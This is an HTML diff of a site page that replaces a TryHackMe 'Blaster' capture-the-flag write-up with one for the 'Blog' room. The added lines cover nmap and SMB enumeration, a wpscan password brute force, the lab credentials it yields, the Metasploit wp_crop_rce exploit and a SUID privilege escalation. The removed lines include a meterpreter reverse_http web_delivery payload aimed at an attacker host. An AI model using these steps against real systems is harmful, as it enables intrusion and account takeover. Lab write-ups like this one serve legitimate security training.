@@ -9,10 +9,10 @@
       
       
       
-        <link rel="prev" href="../basicpentesting/">
+        <link rel="prev" href="../blaster/">
       
       
-        <link rel="next" href="../blog/">
+        <link rel="next" href="../blue/">
       
       
         
@@ -23,7 +23,7 @@
     
     
       
-        <title>Blaster - rdrg0x</title>
+        <title>Blog - rdrg0x</title>
       
     
     
@@ -74,7 +74,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#blaster" class="md-skip">
+        <a href="#blog" class="md-skip">
           Skip to content
         </a>
       
@@ -110,7 +110,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Blaster
+              Blog
             
           </span>
         </div>
@@ -571,6 +571,34 @@
                 
   
   
+  
+  
+    <li class="md-nav__item">
+      <a href="../blaster/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blaster
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
     
   
   
@@ -590,7 +618,7 @@
   <span class="md-ellipsis">
     
   
-    Blaster
+    Blog
   
 
     
@@ -608,7 +636,7 @@
   <span class="md-ellipsis">
     
   
-    Blaster
+    Blog
   
 
     
@@ -667,16 +695,38 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#smb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SMB
+      
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#cve-2019-1388" class="md-nav__link">
+  <a href="#exploit" class="md-nav__link">
     <span class="md-ellipsis">
       
-        CVE-2019-1388
+        Exploit
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation
       
     </span>
   </a>
@@ -687,34 +737,6 @@
   
 </nav>
       
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../blog/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Blog
-  
-
-    
-  </span>
-  
-  
-
-      </a>
     </li>
   
 
@@ -906,16 +928,38 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#smb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SMB
+      
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#cve-2019-1388" class="md-nav__link">
+  <a href="#exploit" class="md-nav__link">
     <span class="md-ellipsis">
       
-        CVE-2019-1388
+        Exploit
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation
       
     </span>
   </a>
@@ -1009,6 +1053,13 @@
       
       
       
+        <a href="../../tags/#tag:linux" class="md-tag">linux</a>
+      
+    
+      
+      
+      
+      
         <a href="../../tags/#tag:tryhackme" class="md-tag">tryhackme</a>
       
     
@@ -1016,60 +1067,83 @@
       
       
       
-        <a href="../../tags/#tag:windows" class="md-tag">windows</a>
+        <a href="../../tags/#tag:wordpress" class="md-tag">wordpress</a>
       
     
   </nav>
 
 
 
-<h1 id="blaster">Blaster<a class="headerlink" href="#blaster" title="Permanent link">&para;</a></h1>
+<h1 id="blog">Blog<a class="headerlink" href="#blog" title="Permanent link">&para;</a></h1>
 <h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
 <h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-p-<span class="w"> </span>--open<span class="w"> </span>-sS<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-vvv<span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w">  </span><span class="m">10</span>.10.42.82<span class="w"> </span>-oN<span class="w"> </span>allPort
-
-PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>REASON
-<span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http<span class="w">          </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">127</span>
-<span class="m">3389</span>/tcp<span class="w"> </span>open<span class="w">  </span>ms-wbt-server<span class="w"> </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">127</span>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-p-<span class="w"> </span>--open<span class="w"> </span>-sS<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-vvv<span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w">  </span><span class="m">10</span>.10.135.66<span class="w"> </span>-oN<span class="w"> </span>allPort.txt
 </code></pre></div>
-<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p80,3389<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.10.42.82<span class="w"> </span>-oN<span class="w"> </span>targeted
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p22,80,139,445<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.10.135.66<span class="w"> </span>-oN<span class="w"> </span>targeted.txt
 
+PORT<span class="w">    </span>STATE<span class="w"> </span>SERVICE<span class="w">     </span>VERSION
+<span class="m">22</span>/tcp<span class="w">  </span>open<span class="w">  </span>ssh<span class="w">         </span>OpenSSH<span class="w"> </span><span class="m">7</span>.6p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.3<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssh-hostkey:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span><span class="m">2048</span><span class="w"> </span><span class="m">57</span>:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+<span class="m">80</span>/tcp<span class="w">  </span>open<span class="w">  </span>http<span class="w">        </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.29<span class="w"> </span><span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span><span class="w"> </span>http-robots.txt:<span class="w"> </span><span class="m">1</span><span class="w"> </span>disallowed<span class="w"> </span>entry<span class="w"> </span>
+<span class="p">|</span>_/wp-admin/
+<span class="p">|</span>_http-title:<span class="w"> </span>Billy<span class="w"> </span>Joel<span class="p">&amp;</span><span class="c1">#039;s IT Blog &amp;#8211; The IT blog</span>
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Apache/2.4.29<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-generator:<span class="w"> </span>WordPress<span class="w"> </span><span class="m">5</span>.0
+<span class="m">139</span>/tcp<span class="w"> </span>open<span class="w">  </span>netbios-ssn<span class="w"> </span>Samba<span class="w"> </span>smbd<span class="w"> </span><span class="m">3</span>.X<span class="w"> </span>-<span class="w"> </span><span class="m">4</span>.X<span class="w"> </span><span class="o">(</span>workgroup:<span class="w"> </span>WORKGROUP<span class="o">)</span>
+<span class="m">445</span>/tcp<span class="w"> </span>open<span class="w">  </span>netbios-ssn<span class="w"> </span>Samba<span class="w"> </span>smbd<span class="w"> </span><span class="m">4</span>.7.6-Ubuntu<span class="w"> </span><span class="o">(</span>workgroup:<span class="w"> </span>WORKGROUP<span class="o">)</span>
+Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span>BLOG<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
 
-PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
-<span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http<span class="w">          </span>Microsoft<span class="w"> </span>IIS<span class="w"> </span>httpd<span class="w"> </span><span class="m">10</span>.0
-<span class="p">|</span>_http-title:<span class="w"> </span>IIS<span class="w"> </span>Windows<span class="w"> </span>Server
-<span class="p">|</span><span class="w"> </span>http-methods:<span class="w"> </span>
-<span class="p">|</span>_<span class="w">  </span>Potentially<span class="w"> </span>risky<span class="w"> </span>methods:<span class="w"> </span>TRACE
-<span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-IIS/10.0
-<span class="m">3389</span>/tcp<span class="w"> </span>open<span class="w">  </span>ms-wbt-server<span class="w"> </span>Microsoft<span class="w"> </span>Terminal<span class="w"> </span>Services
-<span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2024</span>-09-15T21:38:10+00:00<span class="p">;</span><span class="w"> </span>0s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
-<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>RetroWeb
-<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2024</span>-09-14T21:34:41
-<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2025</span>-03-16T21:34:41
-<span class="p">|</span><span class="w"> </span>rdp-ntlm-info:<span class="w"> </span>
-<span class="p">|</span><span class="w">   </span>Target_Name:<span class="w"> </span>RETROWEB
-<span class="p">|</span><span class="w">   </span>NetBIOS_Domain_Name:<span class="w"> </span>RETROWEB
-<span class="p">|</span><span class="w">   </span>NetBIOS_Computer_Name:<span class="w"> </span>RETROWEB
-<span class="p">|</span><span class="w">   </span>DNS_Domain_Name:<span class="w"> </span>RetroWeb
-<span class="p">|</span><span class="w">   </span>DNS_Computer_Name:<span class="w"> </span>RetroWeb
-<span class="p">|</span><span class="w">   </span>Product_Version:<span class="w"> </span><span class="m">10</span>.0.14393
-<span class="p">|</span>_<span class="w">  </span>System_Time:<span class="w"> </span><span class="m">2024</span>-09-15T21:38:06+00:00
-Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
+Host<span class="w"> </span>script<span class="w"> </span>results:
+<span class="p">|</span>_nbstat:<span class="w"> </span>NetBIOS<span class="w"> </span>name:<span class="w"> </span>BLOG,<span class="w"> </span>NetBIOS<span class="w"> </span>user:<span class="w"> </span>&lt;unknown&gt;,<span class="w"> </span>NetBIOS<span class="w"> </span>MAC:<span class="w"> </span>&lt;unknown&gt;<span class="w"> </span><span class="o">(</span>unknown<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>smb2-security-mode:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span><span class="m">3</span>:1:1:<span class="w"> </span>
+<span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>but<span class="w"> </span>not<span class="w"> </span>required
+<span class="p">|</span><span class="w"> </span>smb-security-mode:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>account_used:<span class="w"> </span>guest
+<span class="p">|</span><span class="w">   </span>authentication_level:<span class="w"> </span>user
+<span class="p">|</span><span class="w">   </span>challenge_response:<span class="w"> </span>supported
+<span class="p">|</span>_<span class="w">  </span>message_signing:<span class="w"> </span>disabled<span class="w"> </span><span class="o">(</span>dangerous,<span class="w"> </span>but<span class="w"> </span>default<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>smb-os-discovery:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>OS:<span class="w"> </span>Windows<span class="w"> </span><span class="m">6</span>.1<span class="w"> </span><span class="o">(</span>Samba<span class="w"> </span><span class="m">4</span>.7.6-Ubuntu<span class="o">)</span>
+<span class="p">|</span><span class="w">   </span>Computer<span class="w"> </span>name:<span class="w"> </span>blog
+<span class="p">|</span><span class="w">   </span>NetBIOS<span class="w"> </span>computer<span class="w"> </span>name:<span class="w"> </span>BLOG<span class="se">\x</span><span class="m">00</span>
+<span class="p">|</span><span class="w">   </span>Domain<span class="w"> </span>name:<span class="w"> </span><span class="se">\x</span><span class="m">00</span>
+<span class="p">|</span><span class="w">   </span>FQDN:<span class="w"> </span>blog
+<span class="p">|</span>_<span class="w">  </span>System<span class="w"> </span>time:<span class="w"> </span><span class="m">2024</span>-09-20T22:55:46+00:00
+<span class="p">|</span><span class="w"> </span>smb2-time:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2024</span>-09-20T22:55:46
+<span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span>N/A
+</code></pre></div>
+<h3 id="http">HTTP<a class="headerlink" href="#http" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>whatweb<span class="w"> </span>http://10.10.135.66
 </code></pre></div>
 <p><img alt="alt text" src="img/image.png" /></p>
-<h3 id="http">HTTP<a class="headerlink" href="#http" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code>whatweb<span class="w"> </span>http://10.10.42.82<span class="w">  </span>
-</code></pre></div>
 <p><img alt="alt text" src="img/image-1.png" /></p>
-<div class="highlight"><pre><span></span><code>dirb<span class="w"> </span>http://10.10.42.82/
-dirb<span class="w"> </span>http://10.10.42.82/<span class="w"> </span>-X<span class="w"> </span>.txt,.php
-dirb<span class="w"> </span>http://10.10.42.82/<span class="w"> </span>/usr/share/dirb/wordlists/big.txt<span class="w"> </span>
-</code></pre></div>
 <p><img alt="alt text" src="img/image-2.png" /></p>
-<div class="highlight"><pre><span></span><code>http://10.10.42.82/retro/
-</code></pre></div>
 <p><img alt="alt text" src="img/image-3.png" /></p>
 <p><img alt="alt text" src="img/image-4.png" /></p>
+<p><img alt="alt text" src="img/image-5.png" /></p>
+<div class="highlight"><pre><span></span><code>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://blog.thm/<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">20</span><span class="w"> </span>php,js,html,txt
+</code></pre></div>
+<p><img alt="alt text" src="img/image-6.png" /></p>
+<div class="highlight"><pre><span></span><code>http://blog.thm/robots.txt
+</code></pre></div>
+<p><img alt="alt text" src="img/image-7.png" /></p>
+<div class="highlight"><pre><span></span><code>wpscan<span class="w"> </span>--url<span class="w"> </span>http://10.10.75.249<span class="w"> </span>-e<span class="w"> </span>vp,u<span class="w"> </span>
+</code></pre></div>
+<p><img alt="alt text" src="img/image-8.png" /></p>
+<p>usuarios: 
+- bjoel
+- kwheel</p>
+<p><img alt="alt text" src="img/image-9.png" /></p>
+<p><img alt="alt text" src="img/image-10.png" /></p>
+<div class="highlight"><pre><span></span><code>wpscan<span class="w"> </span>--url<span class="w"> </span>http://10.10.75.249<span class="w"> </span>-U<span class="w"> </span>kwheel<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</code></pre></div>
+<p><img alt="alt text" src="img/image-12.png" /></p>
 <table>
 <thead>
 <tr>
@@ -1079,55 +1153,50 @@ dirb<span class="w"> </span>http://10.10.42.82/<span class="w"> </span>/usr/shar
 </thead>
 <tbody>
 <tr>
-<td>wade</td>
-<td>parzival</td>
+<td>kwheel</td>
+<td>cutiepie1</td>
 </tr>
 </tbody>
 </table>
-<p>Conexión por RDP</p>
-<div class="highlight"><pre><span></span><code>xfreerdp<span class="w"> </span>/u:wade<span class="w"> </span>/p:parzival<span class="w"> </span>/v:10.10.42.82<span class="w"> </span>/dynamic-resolution
-
-xfreerdp<span class="w"> </span>/u:wade<span class="w"> </span>/p:parzival<span class="w"> </span>/v:10.10.42.82<span class="w"> </span>/d:xya.local<span class="w"> </span>/cert-ignore<span class="w"> </span>/dynamic-resolution
+<h3 id="smb">SMB<a class="headerlink" href="#smb" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>smbclient<span class="w"> </span>-L<span class="w"> </span><span class="m">10</span>.10.75.249<span class="w"> </span>-N
 </code></pre></div>
-<p><img alt="alt text" src="img/image-5.png" /></p>
-<p>Flag
-<div class="highlight"><span class="filename">user.txt</span><pre><span></span><code>THM<span class="o">{</span>HACK_PLAYER_ONE<span class="o">}</span>
-</code></pre></div></p>
-<h2 id="cve-2019-1388">CVE-2019-1388<a class="headerlink" href="#cve-2019-1388" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code>CVE-2019-1388<span class="w"> </span>hhupd<span class="w"> </span>
+<p><img alt="alt text" src="img/image-11.png" /></p>
+<div class="highlight"><pre><span></span><code>netexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.75.249<span class="w">  </span>-u<span class="w"> </span>kwheel<span class="w"> </span>-p<span class="w"> </span>cutiepie1<span class="w"> </span>--shares
+crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.75.249<span class="w">  </span>-u<span class="w"> </span>kwheel<span class="w"> </span>-p<span class="w"> </span>cutiepie1<span class="w"> </span>--shares
+
+smbclient<span class="w"> </span>//10.10.75.249/BillySMB<span class="w"> </span>-U<span class="w"> </span>kwheel
 </code></pre></div>
 <p><img alt="alt text" src="img/image-13.png" /></p>
 <p><img alt="alt text" src="img/image-14.png" /></p>
+<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
 <p><img alt="alt text" src="img/image-15.png" /></p>
+<div class="highlight"><pre><span></span><code>use<span class="w"> </span>exploit/multi/http/wp_crop_rce
+
+<span class="nb">set</span><span class="w"> </span>USERNAME<span class="w"> </span>kwheel
+<span class="nb">set</span><span class="w"> </span>PASSWORD<span class="w"> </span>cutiepie1
+<span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span>blog.thm
+<span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">10</span>.9.244.36
+</code></pre></div>
 <p><img alt="alt text" src="img/image-16.png" /></p>
 <p><img alt="alt text" src="img/image-17.png" /></p>
+<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-ls<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
 <p><img alt="alt text" src="img/image-18.png" /></p>
-<p><img alt="alt text" src="img/image-19.png" /></p>
-<p><img alt="alt text" src="img/image-20.png" /></p>
-<p><img alt="alt text" src="img/image-21.png" /></p>
-<p><img alt="alt text" src="img/image-22.png" /></p>
-<div class="highlight"><pre><span></span><code>C:<span class="se">\w</span>indows<span class="se">\S</span>ystem32&gt;<span class="w"> </span>whoami
-nt<span class="w"> </span>authority<span class="se">\s</span>ystem
-</code></pre></div>
-<p><img alt="alt text" src="img/image-6.png" /></p>
-<div class="highlight"><pre><span></span><code><span class="nb">type</span><span class="w"> </span>c:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
-</code></pre></div>
-<p><img alt="alt text" src="img/image-7.png" /></p>
-<p><img alt="alt text" src="img/image-8.png" /></p>
-<div class="highlight"><pre><span></span><code>msfconsole
-use<span class="w"> </span>exploit/multi/script/web_delivery
-</code></pre></div>
-<p><img alt="alt text" src="img/image-9.png" /></p>
-<div class="highlight"><pre><span></span><code><span class="nb">set</span><span class="w"> </span>TARGET<span class="w"> </span><span class="m">2</span>
-<span class="nb">set</span><span class="w"> </span>LHOSTS<span class="w"> </span><span class="m">10</span>.9.244.36
-<span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">80</span>
-<span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>windows/meterpreter/reverse_http
+<div class="highlight"><pre><span></span><code>ltrace<span class="w"> </span>/usr/sbin/checker
 
-run<span class="w"> </span>-j
+<span class="nb">echo</span><span class="w"> </span><span class="nv">$admin</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">admin</span><span class="o">=</span><span class="nb">true</span>
+/usr/sbin/checker
+
+whoami
+root
 </code></pre></div>
-<p><img alt="alt text" src="img/image-10.png" /></p>
-<p><img alt="alt text" src="img/image-11.png" /></p>
-<p><img alt="alt text" src="img/image-12.png" /></p>
+<p><img alt="alt text" src="img/image-19.png" /></p>
+<div class="highlight"><pre><span></span><code>find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-name<span class="w"> </span>user.txt
+</code></pre></div>
+<p><img alt="alt text" src="img/image-20.png" /></p>
 
 
 
